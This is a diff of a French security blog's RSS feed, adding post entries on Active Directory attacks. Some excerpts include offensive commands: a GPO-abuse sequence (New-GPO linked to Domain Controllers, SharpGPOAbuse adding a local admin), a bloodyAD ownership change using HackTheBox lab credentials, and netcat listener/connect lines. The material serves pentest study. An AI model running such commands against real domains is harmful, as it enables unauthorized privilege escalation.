@@ -12,8 +12,15 @@
     <generator>Hugo -- 0.148.2</generator>
     <language>fr</language>
     <copyright>PaperMod Contributors</copyright>
-    <lastBuildDate>Sun, 20 Jul 2025 20:00:00 +0200</lastBuildDate>
+    <lastBuildDate>Sat, 02 Aug 2025 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://nyobemichel.me/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Shells &amp; Payloads</title>
+      <link>https://nyobemichel.me/posts/penetrationtester/shells--payloads/</link>
+      <pubDate>Sat, 02 Aug 2025 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/penetrationtester/shells--payloads/</guid>
+      <description>key vault</description>
+    </item>
     <item>
       <title>DNS</title>
       <link>https://nyobemichel.me/posts/learn/dns/</link>
@@ -359,9 +366,9 @@
     </item>
     <item>
       <title>Kerberoasting : Attaque d&#39;Active Directory via Kerberos</title>
-      <link>https://nyobemichel.me/posts/kerberoasting/</link>
+      <link>https://nyobemichel.me/posts/activedirectory/kerberoasting/</link>
       <pubDate>Mon, 05 May 2025 19:00:00 +0200</pubDate>
-      <guid>https://nyobemichel.me/posts/kerberoasting/</guid>
+      <guid>https://nyobemichel.me/posts/activedirectory/kerberoasting/</guid>
       <description>Une attaque redoutable post-exploitation qui cible les services Kerberos dans les environnements Active Directory. Décryptons ensemble la méthode, les outils et les moyens de défense.</description>
     </item>
     <item>
@@ -373,9 +380,9 @@
     </item>
     <item>
       <title>Reconnaissance Active Directory avec PowerView</title>
-      <link>https://nyobemichel.me/posts/enumeration-active-directory/</link>
+      <link>https://nyobemichel.me/posts/activedirectory/enumeration-active-directory/</link>
       <pubDate>Mon, 05 May 2025 00:00:00 +0000</pubDate>
-      <guid>https://nyobemichel.me/posts/enumeration-active-directory/</guid>
+      <guid>https://nyobemichel.me/posts/activedirectory/enumeration-active-directory/</guid>
       <description>&lt;h2 id=&#34;-1-domaine-et-forêts&#34;&gt;📁 1. Domaine et Forêts&lt;/h2&gt;
 &lt;h3 id=&#34;-obtenir-le-domaine-actuel&#34;&gt;🔍 Obtenir le domaine actuel&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-Domain&lt;/span&gt;                &lt;span class=&#34;c&#34;&gt;# PowerView&lt;/span&gt;
@@ -494,12 +501,203 @@
     </item>
     <item>
       <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/abuse-gpo/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/abuse-gpo/</guid>
+      <description>&lt;p&gt;SharpGPOAbuse.exe&lt;/p&gt;
+&lt;h3 id=&#34;1-commande-powershell-utilisée-pour-créer-un-nouvel-objet-de-stratégie-de-group&#34;&gt;1. commande PowerShell utilisée pour créer un nouvel objet de stratégie de group&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;New-GPO -Name &amp;#34;pwnedGPO
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;2creer-un-nouveau-gpo-nommé-evil-et--lié-à-lunité-dorganisation-des-contrôleurs-de-domaine&#34;&gt;2.creer un nouveau GPO nommé evil et  lié à l&amp;rsquo;unité d&amp;rsquo;organisation des contrôleurs de domaine.&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;New-GPO -Name PwnedGPO | New-GPLink -Target &amp;#34;OU=DOMAIN CONTROLLERS,D
+C=FRIZZ,DC=HTB&amp;#34; -LinkEnabled Yes
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;3-modifier-lobjet-de-stratégie-de-groupe-pour-ajouter-un-administrateur-local&#34;&gt;3. Modifier l&amp;rsquo;objet de stratégie de groupe pour ajouter un administrateur local&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount &amp;lt;Users&amp;gt;--GPO
+Name PwnedGPO
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;4force-gpo-update&#34;&gt;4.Force GPO Update&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gpupdate /force
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;5spawn-administrative-shell&#34;&gt;5.Spawn Administrative Shell&lt;/h3&gt;
+&lt;p&gt;RunasCs.exe pour lancer un shell cmd.exe avec les identifiants&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/abusing-active-directory-acls/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/abusing-active-directory-acls/</guid>
+      <description>&lt;p&gt; exploitation des vulnérabilités du contrôle d&amp;rsquo;accès Windows/Active Directory pour l&amp;rsquo;élévation des privilèges, la persistance et les mouvements latéraux. Couvre les techniques offensives d&amp;rsquo;abus des ACL, l&amp;rsquo;analyse BloodHound et les méthodes de renforcement défensif pour les équipes de sécurité des entreprises.
+ Une liste de contrôle d&amp;rsquo;accès (ACL) est une liste d&amp;rsquo; entrées de contrôle d&amp;rsquo;accès (ACE). Chaque ACE d&amp;rsquo;une ACL identifie un administrateur et spécifie les droits d&amp;rsquo;accès autorisés, refusés ou audités pour cet administrateur. Le descripteur de sécurité d&amp;rsquo;un objet sécurisable peut contenir deux types d&amp;rsquo;ACL : une DACL et une SACL .
+ Une liste de contrôle d&amp;rsquo;accès discrétionnaire (DACL) identifie les personnes autorisées ou non à accéder à un objet sécurisable. Lorsqu&amp;rsquo;un processus tente d&amp;rsquo;accéder à un objet sécurisable, le système vérifie les ACE de la DACL de l&amp;rsquo;objet afin de déterminer s&amp;rsquo;il doit y accéder.
+ &lt;code&gt;DAC&lt;/code&gt; La méthode traditionnelle de mise en œuvre du contrôle d&amp;rsquo;accès contrôle l&amp;rsquo;accès en fonction de l&amp;rsquo;identité du demandeur et des règles d&amp;rsquo;accès qui précisent ce que les demandeurs sont autorisés à faire (ou non). Ce contrôle d&amp;rsquo;accès est discrétionnaire , car une entité peut disposer de droits d&amp;rsquo;accès lui permettant, de son propre chef, d&amp;rsquo;autoriser une autre entité à accéder à une ressource ; contrairement à MAC , où l&amp;rsquo;entité ayant accès à une ressource ne peut pas, de son propre chef, autoriser une autre entité à y accéder. Windows est un exemple de système d&amp;rsquo;exploitation DAC , qui utilise des listes de contrôle d&amp;rsquo;accès discrétionnaires ( DACL ).&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/adcs-attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/adcs-attack/</guid>
+      <description>&lt;p&gt;AD CS est un rôle serveur qui fonctionne comme l&amp;rsquo;implémentation de l&amp;rsquo;infrastructure à clés publiques PKI de Microsoft.
+Comme prévu, il s&amp;rsquo;intègre étroitement à Active Directory et permet l&amp;rsquo;émission de certificats, qui sont des documents électroniques signés numériquement au format X.509, utilisables pour le chiffrement, la signature de messages et/ou l&amp;rsquo;authentification (notre axe de recherche).&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/GhostPack/PSPKIAudit&#34;&gt;https://github.com/GhostPack/PSPKIAudit&lt;/a&gt;
+&lt;a href=&#34;https://posts.specterops.io/certified-pre-owned-d95910965cd2&#34;&gt;https://posts.specterops.io/certified-pre-owned-d95910965cd2&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/bypassing-wdeck/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/bypassing-wdeck/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/cross-forest-attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/cross-forest-attack/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/database-link-abuse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/database-link-abuse/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/dcsync-attaque/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/dcsync-attaque/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/delegation-kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/delegation-kerberos/</guid>
+      <description>&lt;h2 id=&#34;quest-ce-que-la-délégation-kerberos-&#34;&gt;Qu’est-ce que la délégation Kerberos ?&lt;/h2&gt;
+&lt;p&gt;La délégation Kerberos est un paramètre de délégation qui permet aux applications de demander des informations d’identification d’accès à l’utilisateur final pour accéder aux ressources pour le compte de l’utilisateur d’origine.&lt;/p&gt;
+&lt;p&gt;Les trois principaux types de délégation que je vais couvrir sont les suivants:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Délégation sans contrainte&lt;/strong&gt; : tout service peut être utilisé de manière abusive si l’une de ses entrées de délégation est sensible.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Délégation contrainte&lt;/strong&gt; : les entités contraintes peuvent être abusées si l’une de leurs entrées de délégation est sensible.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Délégation contrainte basée sur les ressources (RBCD)&lt;/strong&gt; : les entités contraintes basées sur les ressources peuvent être abusées si l’entité elle-même est sensible.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;délégation-contrainte&#34;&gt;Délégation contrainte&lt;/h2&gt;
+&lt;p&gt;La délégation contrainte permet aux administrateurs de configurer les services auxquels un compte utilisateur ou ordinateur peut déléguer et quels protocoles d&amp;rsquo;authentification peuvent être utilisés&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/dpapi-abuse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/dpapi-abuse/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/dumping-the-certificate-pfx/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/dumping-the-certificate-pfx/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/forest-trust-key-sid-abuse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/forest-trust-key-sid-abuse/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/gmsa-abuse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/gmsa-abuse/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/golden-ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/golden-ticket/</guid>
+      <description>&lt;p&gt;L&amp;rsquo;attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT en utilisant le hachage du mot de passe du compte krbtgt. Lorsque ces tickets sont présentés à un serveur AD, les informations qu&amp;rsquo;ils contiennent ne seront pas du tout vérifiées et seront considérées comme valides car elles sont signées avec le hachage du mot de passe du compte krbtgt.
+L&amp;rsquo; attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT (Ticket Granting Tickets) en utilisant le hachage du mot de passe du compte krbtgt . Lorsque ces tickets sont présentés à un
+serveur AD, les informations qu&amp;rsquo;ils contiennent ne sont pas du tout vérifiées et sont considérées comme valides
+en raison de la signature avec le hachage du mot de passe du compte krbtgt . Par exemple, il est possible de signer
+un ticket pour un utilisateur qui n&amp;rsquo;existe pas, comme DoesNotExist s&amp;rsquo;il s&amp;rsquo;agit d&amp;rsquo;un
+, le billet dit aussi
+administrateur de domaine, et de demander un ticket TGS (Ticket Granting Service) qui lui permet d&amp;rsquo;accéder à des
+machines distantes. Pour des raisons de discrétion, il est presque toujours préférable d&amp;rsquo;utiliser des utilisateurs qui
+existent dans le domaine. Cependant, mettre de fausses informations dans le ticket peut être un excellent moyen de
+montrer l&amp;rsquo;impact et le manque de surveillance d&amp;rsquo;une organisation sur ces événements.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/kerberoast---cross-domain-attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/kerberoast---cross-domain-attack/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/kerberoasting-cibl%C3%A9/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/kerberoasting-cibl%C3%A9/</guid>
+      <description>&lt;p&gt;Cet abus peut survenir lors du contrôle d&amp;rsquo;un objet doté d&amp;rsquo;un &lt;code&gt;GenericAll&lt;/code&gt;, `GenericWrdddtechnique est appelée Kerberoasting ciblé.Cet abus peut survenir lors du contrôle d&amp;rsquo;un objet doté d&amp;rsquo;un GenericAll, GenericWriteou sur la cible. Un membre du groupe Opérateur de compteWriteProperty dispose généralement de ces autorisations.Validated-SPN[]&lt;/p&gt;
+&lt;p&gt;L&amp;rsquo;attaquant peut ajouter un SPN ( &lt;code&gt;ServicePrincipalName&lt;/code&gt;) à ce compte. Une fois ce SPN obtenu, le compte devient vulnérable au &lt;a href=&#34;https://www.thehacker.recipes/ad/movement/kerberos/kerberoast&#34;&gt;Kerberoasting&lt;/a&gt; . Cette technique est appelée Kerberoasting ciblé.Cet abus peut survenir lors du contrôle d&amp;rsquo;un objet doté d&amp;rsquo;un &lt;code&gt;GenericAll&lt;/code&gt;, &lt;code&gt;GenericWrite&lt;/code&gt;ou sur la cible. Un membre du groupe &lt;a href=&#34;https://www.thehacker.recipes/ad/movement/builtins/security-groups&#34;&gt;Opérateur de compte&lt;/a&gt;&lt;code&gt;WriteProperty&lt;/code&gt; dispose généralement de ces autorisations.&lt;code&gt;Validated-SPN&lt;/code&gt;&lt;a href=&#34;https://www.thehacker.recipes/ad/movement/builtins/security-groups&#34;&gt;&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/laps-abuse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/laps-abuse/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/pam-trust---shadow-principal/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/pam-trust---shadow-principal/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
       <link>https://nyobemichel.me/posts/activedirectory/pass-the-hash/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://nyobemichel.me/posts/activedirectory/pass-the-hash/</guid>
       <description>&lt;h2 id=&#34;quest-ce-quune-attaque-pass-the-hash-&#34;&gt;Qu&amp;rsquo;est-ce qu&amp;rsquo;une attaque Pass the Hash ?&lt;/h2&gt;
 &lt;p&gt;L&amp;rsquo;attaque « Pass the Hash » est répandue dans les environnements Windows. Elle exploite le mécanisme d&amp;rsquo;authentification du système d&amp;rsquo;exploitation Windows.&lt;/p&gt;
 &lt;p&gt;Pour éviter de stocker les mots de passe en clair, Windows conserve les hachages NTLM des mots de passe des utilisateurs. Lors du processus d&amp;rsquo;authentification, Windows compare ces hachages plutôt que les mots de passe en clair. L&amp;rsquo;attaque « Pass the Hash » exploite ce mécanisme.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/passe-ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/passe-ticket/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/resource-based-constrained-delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/resource-based-constrained-delegation/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/sans-titre/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/sans-titre/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/ticket-silver/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/ticket-silver/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/activedirectory/unconstrained-delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/activedirectory/unconstrained-delegation/</guid>
+      <description></description>
     </item>
     <item>
       <title></title>
@@ -644,6 +842,13 @@ Microsoft Entra Connect Health assure une surveillance robuste de votre infrastr
     </item>
     <item>
       <title></title>
+      <link>https://nyobemichel.me/posts/formations/api-attack-and-defense/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/formations/api-attack-and-defense/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
       <link>https://nyobemichel.me/posts/labs/summus/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://nyobemichel.me/posts/labs/summus/</guid>
@@ -751,6 +956,92 @@ La Cyber ​​Kill Chain divise une attaque en sept étapes :&lt;/p&gt;
     </item>
     <item>
       <title></title>
+      <link>https://nyobemichel.me/posts/machine/certified---htb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/machine/certified---htb/</guid>
+      <description>&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -sC 10.10.11.41 -v  --min-rate &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -Pn -T4 -p-
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 11:05:11Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Issuer: commonName=certified-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-06-11T21:04:20
+| Not valid after:  2105-05-23T21:04:20
+| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258
+|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea
+|_ssl-date: 2025-08-03T11:06:41+00:00; +7h00m00s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Issuer: commonName=certified-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-06-11T21:04:20
+| Not valid after:  2105-05-23T21:04:20
+| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258
+|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Issuer: commonName=certified-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-06-11T21:04:20
+| Not valid after:  2105-05-23T21:04:20
+| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258
+|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea
+|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Issuer: commonName=certified-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-06-11T21:04:20
+| Not valid after:  2105-05-23T21:04:20
+| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258
+|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea
+|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  msrpc         Microsoft Windows RPC
+49720/tcp open  msrpc         Microsoft Windows RPC
+49728/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-08-03T11:06:04
+|_  start_date: N/A
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;python3 bloodyAD.py  &amp;ndash;host &amp;ldquo;10.10.11.41&amp;rdquo; -d &amp;ldquo;certified.htb&amp;rdquo; -u &amp;ldquo;judith.mader&amp;rdquo; -p &amp;ldquo;judith09&amp;rdquo; set owner management judith.mader&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
       <link>https://nyobemichel.me/posts/microsoft/mouvement-lat%C3%A9ral-et-pivotement/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://nyobemichel.me/posts/microsoft/mouvement-lat%C3%A9ral-et-pivotement/</guid>
@@ -807,11 +1098,36 @@ La Cyber ​​Kill Chain divise une attaque en sept étapes :&lt;/p&gt;
     </item>
     <item>
       <title></title>
+      <link>https://nyobemichel.me/posts/outils/impacket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/outils/impacket/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/outils/metasploit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/outils/metasploit/</guid>
+      <description></description>
+    </item>
+    <item>
+      <title></title>
       <link>https://nyobemichel.me/posts/outils/mimikatz/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://nyobemichel.me/posts/outils/mimikatz/</guid>
       <description>&lt;p&gt;Mimikatz est un outil de post-exploitation très populaire et puissant, le plus souvent utilisé pour vider les informations d&amp;rsquo;identification des utilisateurs à l&amp;rsquo;intérieur d&amp;rsquo;un réseau d&amp;rsquo;annuaire actif. Cependant, nous utiliserons Mimikatz afin de créer un ticket argenté.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/ParrotSec/mimikatz&#34;&gt;https://github.com/ParrotSec/mimikatz&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://nyobemichel.me/posts/outils/netcat/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://nyobemichel.me/posts/outils/netcat/</guid>
+      <description>&lt;p&gt;Example d&amp;rsquo;un écouteur Netcat&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; nc -lvnp &lt;span class=&#34;m&#34;&gt;7777&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;connexion&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Bash&#34; data-lang=&#34;Bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nv 10.129.41.200 &lt;span class=&#34;m&#34;&gt;7777&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     <item>
       <title></title>
